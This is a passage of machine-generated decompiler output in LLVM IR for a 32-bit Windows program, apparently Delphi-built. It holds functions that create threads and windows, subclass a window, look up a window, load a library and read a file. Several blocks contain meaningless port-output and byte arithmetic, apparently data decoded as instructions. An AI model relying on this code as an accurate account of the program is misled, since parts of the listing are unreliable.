  store i32 %11, i32* %ebx.1.reg2mem, !insn.addr !1476
  br i1 %13, label %dec_label_pc_40667d, label %dec_label_pc_406629, !insn.addr !1476

dec_label_pc_406629:                              ; preds = %dec_label_pc_406619
  %14 = call i32 @"@LStrSetLength"(), !insn.addr !1477
  %15 = call i32 @function_403720(), !insn.addr !1478
  %16 = call i32 @function_4045ac(), !insn.addr !1479
  %17 = add i32 %0, 20, !insn.addr !1480
  %18 = inttoptr i32 %17 to %_SECURITY_ATTRIBUTES*, !insn.addr !1481
  %19 = call i32* @CreateThread(%_SECURITY_ATTRIBUTES* %18, i32 0, i32 (i32*)* inttoptr (i32 1 to i32 (i32*)*), i32* inttoptr (i32 4219720 to i32*), i32 0, i32* null), !insn.addr !1482
  store i32 0, i32* %stack_var_-56, align 4, !insn.addr !1483
  %20 = ptrtoint i32* %stack_var_-56 to i32, !insn.addr !1483
  store i32 %20, i32* %esp.0.reg2mem, !insn.addr !1483
  store i32 %11, i32* %ebx.0.reg2mem, !insn.addr !1483
  br label %dec_label_pc_406678, !insn.addr !1483

dec_label_pc_406678:                              ; preds = %dec_label_pc_406629, %dec_label_pc_406614
  %ebx.0.reload = load i32, i32* %ebx.0.reg2mem
  %esp.0.reload = load i32, i32* %esp.0.reg2mem
  %21 = call i32* @CreateThread(%_SECURITY_ATTRIBUTES* bitcast (i32* @0 to %_SECURITY_ATTRIBUTES*), i32 ptrtoint (i32* @0 to i32), i32 (i32*)* bitcast (i32* @0 to i32 (i32*)*), i32* nonnull @0, i32 ptrtoint (i32* @0 to i32), i32* nonnull @0), !insn.addr !1484
  store i32 %esp.0.reload, i32* %esp.1.reg2mem, !insn.addr !1484
  store i32 %ebx.0.reload, i32* %ebx.1.reg2mem, !insn.addr !1484
  br label %dec_label_pc_40667d, !insn.addr !1484

dec_label_pc_40667d:                              ; preds = %dec_label_pc_406678, %dec_label_pc_406619
  %ebx.1.reload = load i32, i32* %ebx.1.reg2mem
  %esp.1.reload = load i32, i32* %esp.1.reg2mem
  %22 = add i32 %0, 20, !insn.addr !1485
  %23 = inttoptr i32 %22 to i32*, !insn.addr !1485
  %24 = load i32, i32* %23, align 4, !insn.addr !1485
  %25 = add i32 %esp.1.reload, -4, !insn.addr !1486
  %26 = inttoptr i32 %25 to i32*, !insn.addr !1486
  store i32 %24, i32* %26, align 4, !insn.addr !1486
  %27 = add i32 %0, 16, !insn.addr !1487
  %28 = inttoptr i32 %27 to i32*, !insn.addr !1487
  %29 = load i32, i32* %28, align 4, !insn.addr !1487
  %30 = add i32 %esp.1.reload, -8, !insn.addr !1488
  %31 = inttoptr i32 %30 to i32*, !insn.addr !1488
  store i32 %29, i32* %31, align 4, !insn.addr !1488
  %32 = add i32 %esp.1.reload, -12, !insn.addr !1489
  %33 = inttoptr i32 %32 to i32*, !insn.addr !1489
  store i32 %ebx.1.reload, i32* %33, align 4, !insn.addr !1489
  %34 = add i32 %0, 8, !insn.addr !1490
  %35 = inttoptr i32 %34 to i32*, !insn.addr !1490
  %36 = load i32, i32* %35, align 4, !insn.addr !1490
  %37 = add i32 %esp.1.reload, -16, !insn.addr !1491
  %38 = inttoptr i32 %37 to i32*, !insn.addr !1491
  store i32 %36, i32* %38, align 4, !insn.addr !1491
  ret x86_fp80 %2, !insn.addr !1491

dec_label_pc_40668c:                              ; preds = %dec_label_pc_406617
  %39 = fdiv x86_fp80 %2, %2, !insn.addr !1492
  ret x86_fp80 %39, !insn.addr !1493
}

define i32 @function_406698() local_unnamed_addr {
dec_label_pc_406698:
  %0 = load i32 (i32, i32, i32)*, i32 (i32, i32, i32)** @global_var_409650, align 4
  %1 = ptrtoint i32 (i32, i32, i32)* %0 to i32
  %2 = call i32* @CreateWindowExA(i32 0, i8* null, i8* null, i32 0, i32 0, i32 0, i32 0, i32 %1, i32* null, i32* nonnull @0, i32* nonnull @0, i32* nonnull @0), !insn.addr !1494
  %3 = ptrtoint i32* %2 to i32, !insn.addr !1494
  %4 = call i32 @SetWindowLongA(i32* inttoptr (i32 4220444 to i32*), i32 -4, i32 %3), !insn.addr !1495
  ret i32 %4, !insn.addr !1496
}

define i32 @function_4066cd(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5, i32 %arg6, i32 %arg7) local_unnamed_addr {
dec_label_pc_4066cd:
  %merge7.reg2mem = alloca i32, !insn.addr !1497
  %0 = call i32 @__decompiler_undefined_function_0()
  %1 = call i32 @__decompiler_undefined_function_0()
  %2 = trunc i32 %1 to i8
  %3 = mul i8 %2, 2, !insn.addr !1497
  %4 = inttoptr i32 %1 to i8*, !insn.addr !1497
  store i8 %3, i8* %4, align 1, !insn.addr !1497
  %5 = add i32 %1, 114, !insn.addr !1498
  %6 = inttoptr i32 %5 to i8*, !insn.addr !1498
  %7 = load i8, i8* %6, align 1, !insn.addr !1498
  %8 = udiv i32 %0, 256, !insn.addr !1498
  %9 = trunc i32 %8 to i8, !insn.addr !1498
  %10 = add i8 %7, %9, !insn.addr !1498
  store i8 %10, i8* %6, align 1, !insn.addr !1498
  %11 = add i8 %2, -32, !insn.addr !1499
  %12 = icmp ult i8 %2, 32, !insn.addr !1499
  %13 = icmp eq i8 %11, 0, !insn.addr !1499
  %14 = zext i8 %11 to i32, !insn.addr !1499
  %15 = and i32 %1, -256, !insn.addr !1499
  %16 = or i32 %15, %14, !insn.addr !1499
  %17 = or i1 %12, %13, !insn.addr !1500
  store i32 %16, i32* %merge7.reg2mem, !insn.addr !1500
  br i1 %17, label %dec_label_pc_4066d6, label %dec_label_pc_406727, !insn.addr !1500

dec_label_pc_4066d6:                              ; preds = %dec_label_pc_4066cd
  %18 = add i32 %16, 105, !insn.addr !1501
  %19 = inttoptr i32 %18 to i8*, !insn.addr !1501
  %20 = load i8, i8* %19, align 1, !insn.addr !1501
  %21 = and i8 %20, %9, !insn.addr !1501
  store i8 %21, i8* %19, align 1, !insn.addr !1501
  %22 = trunc i32 %arg3 to i16, !insn.addr !1502
  %23 = inttoptr i32 %arg6 to i8*, !insn.addr !1502
  %24 = load i8, i8* %23, align 1, !insn.addr !1502
  call void @__asm_outsb(i16 %22, i8 %24), !insn.addr !1502
  %25 = add i32 %arg5, 105, !insn.addr !1503
  %26 = and i32 %25, 65535
  %27 = inttoptr i32 %26 to i8*, !insn.addr !1503
  %28 = load i8, i8* %27, align 1, !insn.addr !1503
  %29 = udiv i32 %arg2, 256, !insn.addr !1503
  %30 = trunc i32 %29 to i8, !insn.addr !1503
  %31 = and i8 %28, %30, !insn.addr !1503
  store i8 %31, i8* %27, align 1, !insn.addr !1503
  %32 = mul i32 %arg5, 2, !insn.addr !1504
  %33 = add i32 %arg2, 115, !insn.addr !1504
  %34 = add i32 %33, %32, !insn.addr !1504
  %35 = inttoptr i32 %34 to i8*, !insn.addr !1504
  %36 = load i8, i8* %35, align 1, !insn.addr !1504
  %37 = trunc i32 %arg2 to i8, !insn.addr !1504
  %38 = add i8 %36, %37, !insn.addr !1504
  %39 = icmp eq i8 %38, 0, !insn.addr !1504
  store i8 %38, i8* %35, align 1, !insn.addr !1504
  store i32 %arg1, i32* %merge7.reg2mem, !insn.addr !1505
  br i1 %39, label %dec_label_pc_406727, label %dec_label_pc_4066e5, !insn.addr !1505

dec_label_pc_4066e5:                              ; preds = %dec_label_pc_4066d6
  %40 = inttoptr i32 %arg6 to i32*, !insn.addr !1506
  %41 = load i32, i32* %40, align 4, !insn.addr !1506
  call void @__asm_outsd(i16 %22, i32 %41), !insn.addr !1506
  %42 = inttoptr i32 %arg5 to i8*, !insn.addr !1507
  %43 = call i32* @FindWindowA(i8* %42, i8* bitcast (i32* @0 to i8*)), !insn.addr !1507
  %44 = ptrtoint i32* %43 to i32, !insn.addr !1507
  %45 = icmp eq i32* %43, null, !insn.addr !1508
  %46 = icmp eq i1 %45, false, !insn.addr !1509
  store i32 %44, i32* %merge7.reg2mem, !insn.addr !1509
  br i1 %46, label %dec_label_pc_406727, label %dec_label_pc_406709, !insn.addr !1509

dec_label_pc_406709:                              ; preds = %dec_label_pc_4066e5
  %47 = call i32 @function_406698(), !insn.addr !1510
  %48 = call i32 @function_4036c8(), !insn.addr !1511
  %49 = inttoptr i32 %48 to i8*, !insn.addr !1512
  %50 = call i32* @LoadLibraryA(i8* %49), !insn.addr !1513
  %51 = ptrtoint i32* %50 to i32, !insn.addr !1513
  ret i32 %51, !insn.addr !1514

dec_label_pc_406727:                              ; preds = %dec_label_pc_4066cd, %dec_label_pc_4066e5, %dec_label_pc_4066d6
  %merge7.reload = load i32, i32* %merge7.reg2mem
  ret i32 %merge7.reload, !insn.addr !1515
}

define i32 @function_4067ed(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5, i32 %arg6, i32 %arg7) local_unnamed_addr {
dec_label_pc_4067ed:
  %esp.0.in.reg2mem = alloca i32*, !insn.addr !1516
  %0 = call i32 @__decompiler_undefined_function_0()
  %1 = call i32 @__decompiler_undefined_function_0()
  %2 = call i32 @__decompiler_undefined_function_0()
  %3 = call i32 @__decompiler_undefined_function_0()
  %4 = call i32 @__decompiler_undefined_function_0()
  %eax = alloca i32, align 4
  %stack_var_32 = alloca i32, align 4
  %stack_var_28 = alloca i32, align 4
  store i32 %arg1, i32* %stack_var_28, align 4
  %stack_var_16 = alloca i32, align 4
  store i32 %arg4, i32* %stack_var_16, align 4
  %5 = bitcast i32* %eax to i8*
  %6 = load i8, i8* %5, align 4, !insn.addr !1516
  %7 = load i32, i32* %eax, align 4
  %8 = trunc i32 %7 to i8, !insn.addr !1516
  %9 = add i8 %6, %8, !insn.addr !1516
  %10 = inttoptr i32 %7 to i8*, !insn.addr !1516
  store i8 %9, i8* %10, align 1, !insn.addr !1516
  %11 = load i32, i32* %eax, align 4, !insn.addr !1517
  %12 = add i32 %11, 114, !insn.addr !1517
  %13 = inttoptr i32 %12 to i8*, !insn.addr !1517
  %14 = load i8, i8* %13, align 1, !insn.addr !1517
  %15 = udiv i32 %2, 256, !insn.addr !1517
  %16 = trunc i32 %15 to i8, !insn.addr !1517
  %17 = add i8 %14, %16, !insn.addr !1517
  store i8 %17, i8* %13, align 1, !insn.addr !1517
  %18 = load i32, i32* %eax, align 4
  %19 = trunc i32 %18 to i8, !insn.addr !1518
  %20 = add i8 %19, -32, !insn.addr !1518
  %21 = icmp ult i8 %19, 32, !insn.addr !1518
  %22 = icmp eq i8 %20, 0, !insn.addr !1518
  %23 = zext i8 %20 to i32, !insn.addr !1518
  %24 = and i32 %18, -256, !insn.addr !1518
  %25 = or i32 %24, %23, !insn.addr !1518
  store i32 %25, i32* %eax, align 4, !insn.addr !1518
  %26 = or i1 %21, %22, !insn.addr !1519
  br i1 %26, label %dec_label_pc_4067f6, label %dec_label_pc_406865, !insn.addr !1519

dec_label_pc_4067f6:                              ; preds = %dec_label_pc_4067ed
  %27 = add i32 %25, 105, !insn.addr !1520
  %28 = inttoptr i32 %27 to i8*, !insn.addr !1520
  %29 = load i8, i8* %28, align 1, !insn.addr !1520
  %30 = and i8 %29, %16, !insn.addr !1520
  store i8 %30, i8* %28, align 1, !insn.addr !1520
  %31 = load i32, i32* %stack_var_28, align 4, !insn.addr !1521
  store i32 %31, i32* %eax, align 4, !insn.addr !1521
  %32 = trunc i32 %arg3 to i16, !insn.addr !1522
  %33 = inttoptr i32 %arg6 to i8*, !insn.addr !1522
  %34 = load i8, i8* %33, align 1, !insn.addr !1522
  call void @__asm_outsb(i16 %32, i8 %34), !insn.addr !1522
  %35 = add i32 %arg5, 105, !insn.addr !1523
  %36 = and i32 %35, 65535
  %37 = inttoptr i32 %36 to i8*, !insn.addr !1523
  %38 = load i8, i8* %37, align 1, !insn.addr !1523
  %39 = udiv i32 %arg2, 256, !insn.addr !1523
  %40 = trunc i32 %39 to i8, !insn.addr !1523
  %41 = and i8 %38, %40, !insn.addr !1523
  store i8 %41, i8* %37, align 1, !insn.addr !1523
  %42 = mul i32 %arg5, 2, !insn.addr !1524
  %43 = add i32 %arg2, 115, !insn.addr !1524
  %44 = add i32 %43, %42, !insn.addr !1524
  %45 = inttoptr i32 %44 to i8*, !insn.addr !1524
  %46 = load i8, i8* %45, align 1, !insn.addr !1524
  %47 = trunc i32 %arg2 to i8, !insn.addr !1524
  %48 = add i8 %46, %47, !insn.addr !1524
  %49 = icmp eq i8 %48, 0, !insn.addr !1524
  store i8 %48, i8* %45, align 1, !insn.addr !1524
  store i32* %stack_var_32, i32** %esp.0.in.reg2mem, !insn.addr !1525
  br i1 %49, label %dec_label_pc_406847, label %dec_label_pc_406805, !insn.addr !1525

dec_label_pc_406805:                              ; preds = %dec_label_pc_4067f6
  %50 = icmp slt i8 %48, 0, !insn.addr !1524
  %51 = inttoptr i32 %arg6 to i32*, !insn.addr !1526
  %52 = load i32, i32* %51, align 4, !insn.addr !1526
  call void @__asm_outsd(i16 %32, i32 %52), !insn.addr !1526
  br i1 %50, label %dec_label_pc_40687c, label %dec_label_pc_40680a, !insn.addr !1527

dec_label_pc_40680a:                              ; preds = %dec_label_pc_406805
  %53 = load i32, i32* %eax, align 4
  %54 = trunc i32 %53 to i8, !insn.addr !1528
  %55 = add i8 %54, -32, !insn.addr !1528
  %56 = icmp ult i8 %54, 32, !insn.addr !1528
  %57 = icmp eq i8 %55, 0, !insn.addr !1528
  %58 = zext i8 %55 to i32, !insn.addr !1528
  %59 = and i32 %53, -256, !insn.addr !1528
  %60 = or i32 %59, %58, !insn.addr !1528
  store i32 %60, i32* %eax, align 4, !insn.addr !1528
  %61 = or i1 %56, %57, !insn.addr !1529
  br i1 %61, label %dec_label_pc_40680e, label %dec_label_pc_40687d, !insn.addr !1529

dec_label_pc_40680e:                              ; preds = %dec_label_pc_40680a
  %62 = add i32 %arg2, 105, !insn.addr !1530
  %63 = inttoptr i32 %62 to i8*, !insn.addr !1530
  %64 = load i8, i8* %63, align 1, !insn.addr !1530
  %65 = udiv i32 %53, 256, !insn.addr !1530
  %66 = trunc i32 %65 to i8, !insn.addr !1530
  %67 = and i8 %64, %66, !insn.addr !1530
  store i8 %67, i8* %63, align 1, !insn.addr !1530
  %68 = add i32 %arg6, 105, !insn.addr !1531
  %69 = inttoptr i32 %68 to i8*, !insn.addr !1531
  %70 = load i8, i8* %69, align 1, !insn.addr !1531
  %71 = and i8 %70, %40, !insn.addr !1531
  store i8 %71, i8* %69, align 1, !insn.addr !1531
  %72 = load i32, i32* %eax, align 4
  %73 = inttoptr i32 %72 to i8*, !insn.addr !1532
  %74 = load i8, i8* %73, align 1, !insn.addr !1532
  %75 = trunc i32 %72 to i8, !insn.addr !1532
  %76 = add i8 %74, %75, !insn.addr !1532
  store i8 %76, i8* %73, align 1, !insn.addr !1532
  %77 = load i32, i32* %eax, align 4
  %78 = inttoptr i32 %77 to i8*, !insn.addr !1533
  %79 = load i8, i8* %78, align 1, !insn.addr !1533
  %80 = trunc i32 %77 to i8, !insn.addr !1533
  %81 = add i8 %79, %80, !insn.addr !1533
  store i8 %81, i8* %78, align 1, !insn.addr !1533
  %82 = inttoptr i32 %arg2 to i32*, !insn.addr !1534
  %83 = load i32, i32* %82, align 4, !insn.addr !1534
  %84 = add i32 %83, %arg6, !insn.addr !1534
  store i32 %84, i32* %82, align 4, !insn.addr !1534
  %85 = load i32, i32* %eax, align 4
  %86 = inttoptr i32 %85 to i8*, !insn.addr !1535
  %87 = load i8, i8* %86, align 1, !insn.addr !1535
  %88 = trunc i32 %85 to i8, !insn.addr !1535
  %89 = add i8 %87, %88, !insn.addr !1535
  store i8 %89, i8* %86, align 1, !insn.addr !1535
  store i32 %arg5, i32* %stack_var_28, align 4, !insn.addr !1536
  %90 = call i32 @__readfsdword(i32 0), !insn.addr !1537
  store i32 %90, i32* %stack_var_16, align 4, !insn.addr !1537
  %91 = ptrtoint i32* %stack_var_16 to i32, !insn.addr !1537
  call void @__writefsdword(i32 0, i32 %91), !insn.addr !1538
  %92 = load i32, i32* @global_var_4096d4, align 4, !insn.addr !1539
  %93 = add i32 %92, 1, !insn.addr !1539
  %94 = icmp eq i32 %93, 0, !insn.addr !1539
  store i32 %93, i32* @global_var_4096d4, align 4, !insn.addr !1539
  %95 = icmp eq i1 %94, false, !insn.addr !1540
  br i1 %95, label %dec_label_pc_40683f, label %dec_label_pc_406835, !insn.addr !1540

dec_label_pc_406835:                              ; preds = %dec_label_pc_40680e
  %96 = call i32 @"@LStrClr"(), !insn.addr !1541
  br label %dec_label_pc_40683f, !insn.addr !1541

dec_label_pc_40683f:                              ; preds = %dec_label_pc_406835, %dec_label_pc_40680e
  store i32 0, i32* %eax, align 4, !insn.addr !1542
  %97 = load i32, i32* %stack_var_16, align 4, !insn.addr !1543
  call void @__writefsdword(i32 0, i32 %97), !insn.addr !1544
  store i32* %stack_var_28, i32** %esp.0.in.reg2mem, !insn.addr !1544
  br label %dec_label_pc_406847, !insn.addr !1544

dec_label_pc_406847:                              ; preds = %dec_label_pc_40683f, %dec_label_pc_4067f6
  %esp.0.in.reload = load i32*, i32** %esp.0.in.reg2mem
  %esp.0 = ptrtoint i32* %esp.0.in.reload to i32
  %98 = add i32 %esp.0, -4, !insn.addr !1545
  %99 = inttoptr i32 %98 to i32*, !insn.addr !1545
  store i32 4221012, i32* %99, align 4, !insn.addr !1545
  %100 = load i32, i32* %eax, align 4, !insn.addr !1546
  ret i32 %100, !insn.addr !1546

dec_label_pc_406865:                              ; preds = %dec_label_pc_4067ed
  %101 = mul i32 %4, 2, !insn.addr !1547
  %102 = add i32 %1, 105, !insn.addr !1547
  %103 = add i32 %102, %101, !insn.addr !1547
  %104 = inttoptr i32 %103 to i32*, !insn.addr !1547
  %105 = load i32, i32* %104, align 4, !insn.addr !1547
  %106 = or i32 %105, %3, !insn.addr !1547
  store i32 %106, i32* %104, align 4, !insn.addr !1547
  %107 = add i32 %0, -1, !insn.addr !1548
  %108 = trunc i32 %3 to i16, !insn.addr !1549
  %109 = inttoptr i32 %107 to i32*, !insn.addr !1549
  %110 = load i32, i32* %109, align 4, !insn.addr !1549
  call void @__asm_outsd(i16 %108, i32 %110), !insn.addr !1549
  %111 = load i32, i32* %eax, align 4, !insn.addr !1550
  %112 = call i8 @__readgsbyte(i32 %111), !insn.addr !1550
  %113 = load i32, i32* %eax, align 4
  %114 = trunc i32 %113 to i8, !insn.addr !1550
  %115 = or i8 %112, %114, !insn.addr !1550
  call void @__writegsbyte(i32 %113, i8 %115), !insn.addr !1550
  %116 = load i32, i32* %eax, align 4
  %117 = inttoptr i32 %116 to i8*, !insn.addr !1551
  %118 = load i8, i8* %117, align 1, !insn.addr !1551
  %119 = trunc i32 %116 to i8, !insn.addr !1551
  %120 = add i8 %118, %119, !insn.addr !1551
  store i8 %120, i8* %117, align 1, !insn.addr !1551
  %121 = load i32, i32* %eax, align 4
  %122 = trunc i32 %121 to i8, !insn.addr !1552
  %123 = inttoptr i32 %121 to i8*, !insn.addr !1552
  %124 = load i8, i8* %123, align 1, !insn.addr !1552
  %125 = add i8 %124, %122, !insn.addr !1552
  %126 = zext i8 %125 to i32, !insn.addr !1552
  %127 = and i32 %121, -256, !insn.addr !1552
  %128 = or i32 %127, %126, !insn.addr !1552
  %129 = inttoptr i32 %128 to i8*, !insn.addr !1553
  %130 = load i8, i8* %129, align 1, !insn.addr !1553
  %131 = trunc i32 %3 to i8, !insn.addr !1554
  %132 = add i8 %125, %131, !insn.addr !1553
  %133 = add i8 %132, %130, !insn.addr !1554
  store i8 %133, i8* %129, align 1, !insn.addr !1554
  %134 = add i32 %128, 1, !insn.addr !1555
  store i32 %134, i32* %eax, align 4, !insn.addr !1555
  %135 = inttoptr i32 %134 to i8*, !insn.addr !1556
  %136 = load i8, i8* %135, align 1, !insn.addr !1556
  %137 = trunc i32 %134 to i8, !insn.addr !1556
  %138 = add i8 %136, %137, !insn.addr !1556
  store i8 %138, i8* %135, align 1, !insn.addr !1556
  br label %dec_label_pc_40687c, !insn.addr !1556

dec_label_pc_40687c:                              ; preds = %dec_label_pc_406865, %dec_label_pc_406805
  %139 = load i32, i32* %eax, align 4, !insn.addr !1556
  ret i32 %139, !insn.addr !1556

dec_label_pc_40687d:                              ; preds = %dec_label_pc_40680a
  %140 = inttoptr i32 %60 to i8*, !insn.addr !1557
  %141 = load i8, i8* %140, align 1, !insn.addr !1557
  %142 = add i8 %141, %55, !insn.addr !1557
  store i8 %142, i8* %140, align 1, !insn.addr !1557
  %143 = load i32, i32* %eax, align 4
  %144 = inttoptr i32 %143 to i8*, !insn.addr !1558
  %145 = load i8, i8* %144, align 1, !insn.addr !1558
  %146 = trunc i32 %arg3 to i8, !insn.addr !1558
  %147 = add i8 %145, %146, !insn.addr !1558
  store i8 %147, i8* %144, align 1, !insn.addr !1558
  %148 = load i32, i32* %eax, align 4, !insn.addr !1559
  %149 = add i32 %148, 1, !insn.addr !1559
  %150 = mul i32 %149, 2, !insn.addr !1560
  %151 = inttoptr i32 %150 to i8*, !insn.addr !1560
  %152 = load i8, i8* %151, align 2, !insn.addr !1560
  %153 = trunc i32 %149 to i8, !insn.addr !1560
  %154 = add i8 %152, %153, !insn.addr !1560
  store i8 %154, i8* %151, align 2, !insn.addr !1560
  %155 = inttoptr i32 %149 to i8*, !insn.addr !1561
  %156 = load i8, i8* %155, align 1, !insn.addr !1561
  %157 = add i8 %156, %153, !insn.addr !1561
  store i8 %157, i8* %155, align 1, !insn.addr !1561
  ret i32 %149, !insn.addr !1562
}

define i32 @function_40689b() local_unnamed_addr {
dec_label_pc_40689b:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !1563
}

define i32 @function_4068a8() local_unnamed_addr {
dec_label_pc_4068a8:
  %esp.1.reg2mem = alloca i32, !insn.addr !1564
  %stack_var_-116 = alloca i32, align 4
  %stack_var_-92 = alloca i32, align 4
  %stack_var_-84 = alloca i8*, align 4
  %stack_var_-56 = alloca i32, align 4
  %0 = call i32 @__readfsdword(i32 0), !insn.addr !1565
  store i32 %0, i32* %stack_var_-56, align 4, !insn.addr !1565
  %1 = ptrtoint i32* %stack_var_-56 to i32, !insn.addr !1565
  call void @__writefsdword(i32 0, i32 %1), !insn.addr !1566
  %2 = call i32 @"@LStrCat3"(), !insn.addr !1567
  %3 = call i32 @function_4036c8(), !insn.addr !1568
  %4 = inttoptr i32 %3 to i8*, !insn.addr !1569
  store i8* %4, i8** %stack_var_-84, align 4, !insn.addr !1569
  %5 = ptrtoint i8** %stack_var_-84 to i32, !insn.addr !1569
  %6 = call i32* @CreateFileA(i8* %4, i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32), %_SECURITY_ATTRIBUTES* bitcast (i32* @0 to %_SECURITY_ATTRIBUTES*), i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32), i32* nonnull @0), !insn.addr !1570
  %7 = icmp eq i32* %6, inttoptr (i32 -1 to i32*), !insn.addr !1571
  store i32 %5, i32* %esp.1.reg2mem, !insn.addr !1572
  br i1 %7, label %dec_label_pc_406a47, label %dec_label_pc_406912, !insn.addr !1572

dec_label_pc_406912:                              ; preds = %dec_label_pc_4068a8
  %8 = ptrtoint i32* %6 to i32, !insn.addr !1570
  store i32 %8, i32* %stack_var_-92, align 4, !insn.addr !1573
  %9 = ptrtoint i32* %stack_var_-92 to i32, !insn.addr !1573
  %10 = call i32 @GetFileSize(i32* null, i32* %6), !insn.addr !1574
  %11 = add i32 %10, 1
  %12 = icmp ult i32 %11, 2
  store i32 %9, i32* %esp.1.reg2mem, !insn.addr !1575
  br i1 %12, label %dec_label_pc_406a47, label %dec_label_pc_40692e, !insn.addr !1575

dec_label_pc_40692e:                              ; preds = %dec_label_pc_406912
  %13 = call i32 @"@LStrSetLength"(), !insn.addr !1576
  %14 = call i32 @function_403720(), !insn.addr !1577
  %15 = inttoptr i32 %14 to i32*, !insn.addr !1578
  %16 = call i1 @ReadFile(i32* %15, i32* %6, i32 ptrtoint (i32* @0 to i32), i32* nonnull @0, %_OVERLAPPED* bitcast (i32* @0 to %_OVERLAPPED*)), !insn.addr !1578
  store i32 %8, i32* %stack_var_-116, align 4, !insn.addr !1579
  %17 = ptrtoint i32* %stack_var_-116 to i32, !insn.addr !1579
  %18 = call i1 @CloseHandle(i32* %6), !insn.addr !1580
  %19 = call i32 @function_4046d4(), !insn.addr !1581
  store i32 %17, i32* %esp.1.reg2mem
  br label %dec_label_pc_406a47

dec_label_pc_406a47:                              ; preds = %dec_label_pc_40692e, %dec_label_pc_406912, %dec_label_pc_4068a8
  %esp.1.reload = load i32, i32* %esp.1.reg2mem
  %20 = inttoptr i32 %esp.1.reload to i32*, !insn.addr !1582
  %21 = load i32, i32* %20, align 4, !insn.addr !1582
  call void @__writefsdword(i32 0, i32 %21), !insn.addr !1583
  %22 = add i32 %esp.1.reload, 8, !insn.addr !1584
  %23 = inttoptr i32 %22 to i32*, !insn.addr !1584
  store i32 4221545, i32* %23, align 4, !insn.addr !1584
  %24 = call i32 @"@LStrArrayClr"(), !insn.addr !1585
  ret i32 %24, !insn.addr !1586
}

define i32 @function_406a62() local_unnamed_addr {
dec_label_pc_406a62:
  %0 = call i32 @"@HandleFinally"(), !insn.addr !1587
  ret i32 %0, !insn.addr !1587
}

define i32 @function_406a67() local_unnamed_addr {
dec_label_pc_406a67:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !1588
}

define i32 @function_406a69(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_406a69:
  %0 = call i32 @__decompiler_undefined_function_0()
  %1 = add i32 %0, -4, !insn.addr !1589
  %2 = inttoptr i32 %1 to i32*, !insn.addr !1589
  %3 = load i32, i32* %2, align 4, !insn.addr !1589
  ret i32 %3, !insn.addr !1590
}

define i32 @function_406aa0() local_unnamed_addr {
dec_label_pc_406aa0:
  %esp.2.reg2mem = alloca i32, !insn.addr !1591
  %esp.1.reg2mem = alloca i32, !insn.addr !1591
  %esi.0.reg2mem = alloca i32, !insn.addr !1591
  %esp.0.reg2mem = alloca i32, !insn.addr !1591
  %ebx.0.reg2mem = alloca i32, !insn.addr !1591
  %stack_var_-68 = alloca i8*, align 4
  %stack_var_-40 = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  store i32 0, i32* %stack_var_-8, align 4, !insn.addr !1592
  %0 = call i32 @__readfsdword(i32 0), !insn.addr !1593
  store i32 %0, i32* %stack_var_-40, align 4, !insn.addr !1593
  %1 = ptrtoint i32* %stack_var_-40 to i32, !insn.addr !1593
  call void @__writefsdword(i32 0, i32 %1), !insn.addr !1594
  %2 = call i32 @function_403c88(), !insn.addr !1595
  %3 = icmp slt i32 %2, 1
  store i32 %1, i32* %esp.2.reg2mem, !insn.addr !1596
  br i1 %3, label %dec_label_pc_406b89, label %dec_label_pc_406ace, !insn.addr !1596

dec_label_pc_406ace:                              ; preds = %dec_label_pc_406aa0
  %4 = call i32 @"@LStrCat3"(), !insn.addr !1597
  %5 = call i32 @function_4036c8(), !insn.addr !1598
  %6 = inttoptr i32 %5 to i8*, !insn.addr !1599
  store i8* %6, i8** %stack_var_-68, align 4, !insn.addr !1599
  %7 = ptrtoint i8** %stack_var_-68 to i32, !insn.addr !1599
  %8 = call i32* @CreateFileA(i8* %6, i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32), %_SECURITY_ATTRIBUTES* bitcast (i32* @0 to %_SECURITY_ATTRIBUTES*), i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32), i32* nonnull @0), !insn.addr !1600
  %9 = icmp eq i32* %8, inttoptr (i32 -1 to i32*), !insn.addr !1601
  store i32 %7, i32* %esp.2.reg2mem, !insn.addr !1602
  br i1 %9, label %dec_label_pc_406b89, label %dec_label_pc_406b0a, !insn.addr !1602

dec_label_pc_406b0a:                              ; preds = %dec_label_pc_406ace
  %10 = call i32 @"@LStrClr"(), !insn.addr !1603
  %11 = call i32 @function_403c90(), !insn.addr !1604
  %12 = icmp slt i32 %11, 0, !insn.addr !1605
  store i32 %7, i32* %esp.1.reg2mem, !insn.addr !1606
  br i1 %12, label %dec_label_pc_406b54, label %dec_label_pc_406b22, !insn.addr !1606

dec_label_pc_406b22:                              ; preds = %dec_label_pc_406b0a
  %13 = add i32 %11, 1, !insn.addr !1607
  store i32 0, i32* %ebx.0.reg2mem, !insn.addr !1608
  store i32 %7, i32* %esp.0.reg2mem, !insn.addr !1608
  store i32 %13, i32* %esi.0.reg2mem, !insn.addr !1608
  br label %dec_label_pc_406b25, !insn.addr !1608

dec_label_pc_406b25:                              ; preds = %dec_label_pc_406b25, %dec_label_pc_406b22
  %esi.0.reload = load i32, i32* %esi.0.reg2mem
  %esp.0.reload = load i32, i32* %esp.0.reg2mem
  %ebx.0.reload = load i32, i32* %ebx.0.reg2mem
  %14 = add i32 %esp.0.reload, -4, !insn.addr !1609
  %15 = inttoptr i32 %14 to i32*, !insn.addr !1609
  store i32 0, i32* %15, align 4, !insn.addr !1609
  %16 = load i32, i32* @global_var_4096dc, align 4, !insn.addr !1610
  %17 = mul i32 %ebx.0.reload, 8, !insn.addr !1611
  %18 = add i32 %16, %17, !insn.addr !1611
  %19 = inttoptr i32 %18 to i32*, !insn.addr !1611
  %20 = load i32, i32* %19, align 4, !insn.addr !1611
  %21 = add i32 %esp.0.reload, -8, !insn.addr !1611
  %22 = inttoptr i32 %21 to i32*, !insn.addr !1611
  store i32 %20, i32* %22, align 4, !insn.addr !1611
  %23 = add i32 %esp.0.reload, -12, !insn.addr !1612
  %24 = inttoptr i32 %23 to i32*, !insn.addr !1612
  store i32 ptrtoint (i32* @global_var_406bd0 to i32), i32* %24, align 4, !insn.addr !1612
